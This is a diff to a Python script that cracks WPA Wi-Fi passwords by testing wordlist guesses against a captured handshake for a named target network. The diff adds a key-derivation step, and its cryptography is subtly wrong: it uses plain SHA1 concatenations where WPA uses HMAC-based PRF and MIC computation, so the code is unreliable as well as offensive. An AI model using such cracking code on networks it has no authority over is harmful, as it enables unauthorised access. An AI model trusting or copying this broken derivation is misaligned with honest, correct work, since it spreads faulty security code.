@@ -26,6 +26,13 @@ def derive_psk(password, ssid):
     psk = PBKDF2(password_bytes, ssid_bytes, dkLen=32, count=4096, prf=lambda p, s: hashlib.sha1(p + s).digest())
     return psk
 
+# Function to derive the master key and transient keys using PBKDF2
+def derive_keys(psk, key_nonce, key_iv):
+    # The master key and transient key derivation as per aircrack-ng process
+    master_key = hashlib.sha1(psk + key_nonce + key_iv).digest()
+    transient_key = hashlib.sha1(master_key + key_nonce).digest()
+    return master_key, transient_key
+
 # Function to verify the password by checking the MIC (Message Integrity Code)
 def verify_password(handshake, password, ssid):
     # Handle 3 EAPOL packets, extract the MIC from the last packet (third packet in this case)
@@ -40,9 +47,12 @@ def verify_password(handshake, password, ssid):
     # Derive the PSK using the password and SSID
     psk = derive_psk(password, ssid)
 
+    # Derive Master Key and Transient Key
+    master_key, transient_key = derive_keys(psk, key_nonce, key_iv)
+
     # Create the MIC from the derived PSK
     data_to_hash = handshake[2].load[:-16] + key_nonce + key_iv
-    generated_mic = hashlib.sha1(psk + data_to_hash).digest()[-16:]
+    generated_mic = hashlib.sha1(master_key + data_to_hash).digest()[-16:]
 
     # Compare the generated MIC with the extracted MIC
     return generated_mic == mic
@@ -75,7 +85,7 @@ def crack_wpa(pcap_file, ssid, wordlist):
 # Example usage:
 pcap_file = "shak.cap"  # Path to the .cap file containing the WPA handshake
 ssid = "PEKLO"          # SSID of the target network
-wordlist = "pwd.pwds"    # Path to the wordlist file containing potential passwords
+wordlist = "pwd.txt"    # Path to the wordlist file containing potential passwords
 
 # Start the cracking process
 crack_wpa(pcap_file, ssid, wordlist)
